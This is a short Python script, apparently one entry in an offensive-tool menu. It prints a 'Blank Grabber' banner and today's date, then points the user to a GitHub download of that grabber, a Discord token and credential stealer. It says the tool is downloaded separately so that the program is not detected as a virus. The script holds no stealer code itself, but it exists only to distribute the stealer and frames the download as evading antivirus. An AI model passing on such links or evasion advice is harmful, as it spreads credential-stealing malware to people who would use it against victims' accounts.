import time
import os
from datetime import date
from requests import get, post
from random import randint
from colorama import Fore, Style, init

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

today = date.today()
  
def clearcmd():
    os.system('cls' if os.name == 'nt' else 'clear')

def discordgrabber():
  print(bcolors.OKBLUE + "Today's date:",today)
  print(bcolors.OKBLUE + """                      
__________.__                 __       ________            ___.  ___.                 
\______   \  | _____    ____ |  | __  /  _____/___________ \_ |__\_ |__   ___________ 
 |    |  _/  | \__  \  /    \|  |/ / /   \  __\_  __ \__  \ | __ \| __ \_/ __ \_  __ 
 |    |   \  |__/ __ \|   |  \    <  \    \_\  \  | \// __ \| \_\ \ \_\ \  ___/|  | \/
 |______  /____(____  /___|  /__|_ \  \______  /__|  (____  /___  /___  /\___  >__|   
        \/          \/     \/     \/         \/           \/    \/    \/     \/       
                                  
              Download                                                                 
        """)
  print(bcolors.OKBLUE + """
    You need to download the file, since we don't want this program to get detected as a virus.
    https://github.com/Blank-c/Blank-Grabber
    """)
  time.sleep(10.00)
discordgrabber()
